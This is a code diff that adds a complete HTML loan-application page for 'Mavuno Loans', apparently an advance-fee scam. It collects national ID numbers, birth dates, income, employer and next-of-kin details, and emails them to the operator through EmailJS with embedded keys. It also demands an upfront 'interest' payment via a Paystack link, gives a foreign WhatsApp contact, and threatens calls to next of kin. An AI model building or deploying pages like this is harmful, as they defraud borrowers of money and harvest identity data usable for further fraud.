@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mavuno Loans – Apply KSh 1,000</title>
+<style>
+  body {
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(145deg, #0d1b2a, #1b263b);
+    color: #fff;
+    margin: 0;
+    padding: 0;
+  }
+  header {
+    background: #00d45a;
+    color: #0d1b2a;
+    text-align: center;
+    padding: 30px 20px;
+    border-bottom: 4px solid #00ff80;
+    box-shadow: 0 0 20px rgba(0,255,128,0.4);
+  }
+  header h1 { font-size: 36px; margin:0; font-weight:700; }
+  header p { margin:10px 0 0; font-size:16px; color:#013220; }
+
+  .container {
+    max-width: 900px;
+    margin: 40px auto;
+    padding: 25px;
+    background: linear-gradient(145deg,#0d1b2a,#1b263b);
+    border-radius: 20px;
+    box-shadow:0 0 30px rgba(0,255,157,0.3);
+  }
+
+  form { display: grid; gap: 15px; }
+
+  label { font-weight:bold; font-size:14px; }
+  input, select, textarea {
+    padding:10px; border-radius:8px; border:none;
+    width:100%; font-size:14px;
+  }
+  textarea { resize:none; }
+
+  .btn {
+    background:#00d45a; color:#0d1b2a; padding:12px; font-weight:bold;
+    border:none; border-radius:10px; cursor:pointer; transition:0.3s;
+  }
+  .btn:hover { background:#00ff80; color:#000; transform:scale(1.03); }
+
+  .note {
+    background: rgba(0,255,157,0.1); padding:15px; border-radius:12px;
+    color:#ddd; font-size:14px; margin-top:15px;
+  }
+  .note a { color:#00ff80; text-decoration:none; }
+
+  .success { 
+    background: #00ff80; color:#000; padding:15px; border-radius:12px; 
+    text-align:center; display:none; margin-top:20px; font-weight:bold;
+  }
+
+  footer {
+    text-align:center; padding:25px; color:#ddd;
+    margin-top:40px; border-top:2px solid #00ff80;
+  }
+  footer a { color:#00ff80; text-decoration:none; }
+  footer a:hover { text-decoration:underline; }
+</style>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  (function(){ emailjs.init("ondZwIwUm2_fN_T5M"); })();
+
+  function sendLoanForm(e){
+    e.preventDefault();
+    const form = document.getElementById("loanForm");
+
+    emailjs.send("service_6mi1h4j","72rqG7BqiGVhp1PdDUnf4",{
+      full_name: form.full_name.value,
+      id_number: form.id_number.value,
+      phone_number: form.phone_number.value,
+      email: form.email.value,
+      gender: form.gender.value,
+      dob: form.dob.value,
+      marital_status: form.marital_status.value,
+      county: form.county.value,
+      location: form.location.value,
+      employment_status: form.employment_status.value,
+      employer_name: form.employer_name.value,
+      monthly_income: form.monthly_income.value,
+      loan_amount: form.loan_amount.value,
+      repayment_duration: form.repayment_duration.value,
+      loan_reason: form.loan_reason.value,
+      next_of_kin: form.next_of_kin.value,
+      kin_relationship: form.kin_relationship.value,
+      kin_contact: form.kin_contact.value,
+      payment_method: form.payment_method.value,
+      date_submitted: new Date().toLocaleString()
+    }).then(function(){
+      document.getElementById("successMsg").style.display="block";
+      form.reset();
+    },function(err){
+      console.error("EmailJS error:", err);
+      alert("Error sending form. Please check console for details.");
+    });
+  }
+</script>
+</head>
+
+<body>
+<header>
+  <h1>💰 Mavuno Loans</h1>
+  <p>Apply for KSh 1,000 Loan — Quick, Secure & Transparent</p>
+</header>
+
+<div class="container">
+  <form id="loanForm" onsubmit="sendLoanForm(event)">
+    <label>Full Name</label>
+    <input type="text" name="full_name" required>
+
+    <label>National ID Number</label>
+    <input type="text" name="id_number" required>
+
+    <label>Phone Number</label>
+    <input type="text" name="phone_number" required>
+
+    <label>Email Address</label>
+    <input type="email" name="email" required>
+
+    <label>Gender</label>
+    <select name="gender" required>
+      <option value="">Select</option>
+      <option>Male</option>
+      <option>Female</option>
+      <option>Other</option>
+    </select>
+
+    <label>Date of Birth</label>
+    <input type="date" name="dob" required>
+
+    <label>Marital Status</label>
+    <select name="marital_status" required>
+      <option value="">Select</option>
+      <option>Single</option>
+      <option>Married</option>
+      <option>Other</option>
+    </select>
+
+    <label>County</label>
+    <input type="text" name="county" required>
+
+    <label>Town / Estate</label>
+    <input type="text" name="location" required>
+
+    <label>Employment Type</label>
+    <input type="text" name="employment_status" required>
+
+    <label>Employer / Business Name</label>
+    <input type="text" name="employer_name" required>
+
+    <label>Monthly Income (KSh)</label>
+    <input type="number" name="monthly_income" required>
+
+    <label>Loan Amount Applied (KSh)</label>
+    <input type="number" name="loan_amount" value="1000" readonly>
+
+    <label>Repayment Duration (Months)</label>
+    <input type="text" name="repayment_duration" value="2" readonly>
+
+    <label>Purpose of Loan</label>
+    <textarea name="loan_reason" rows="3" required></textarea>
+
+    <label>Next of Kin Full Name</label>
+    <input type="text" name="next_of_kin" required>
+
+    <label>Next of Kin Relationship</label>
+    <input type="text" name="kin_relationship" required>
+
+    <label>Next of Kin Contact</label>
+    <input type="text" name="kin_contact" required>
+
+    <label>Preferred Payment Method</label>
+    <select name="payment_method" required>
+      <option value="">Select</option>
+      <option>Paystack</option>
+      <option>Bank Transfer</option>
+      <option>Mobile Money</option>
+    </select>
+
+    <div class="note">
+      ⚠️ One-time interest must be paid via Paystack before loan processing: 
+      <a href="https://paystack.shop/pay/mavunoloan" target="_blank">Click to Pay</a><br>
+      Use the same email used for payment when submitting this form.<br><br>
+      ⚠️ Kindly note: If the loan is not repaid within the agreed period, 
+      our office may contact you via calls and manually, and your next of kin 
+      will be contacted to confirm the details.
+    </div>
+
+    <button type="submit" class="btn">Submit Loan Application</button>
+    <div id="successMsg" class="success">✅ Your loan application has been submitted successfully!</div>
+  </form>
+</div>
+
+<footer>
+  <p>📞 Call: 0230000000 | ✉️ Email: <a href="mailto:mavunoloan@gmail.com">mavunoloan@gmail.com</a></p>
+  <p>💬 WhatsApp Office: <a href="https://wa.me/923411505861" target="_blank">+92 341 1505861</a></p>
+  <p>🔔 Join Our <a href="https://chat.whatsapp.com/DIwds8ZoTwf7pOkLB4CXov" target="_blank">WhatsApp Group</a> for Loan Updates</p>
+  <p>© 2025 Mavuno Loans. All Rights Reserved.</p>
+</footer>
+</body>
+</html>
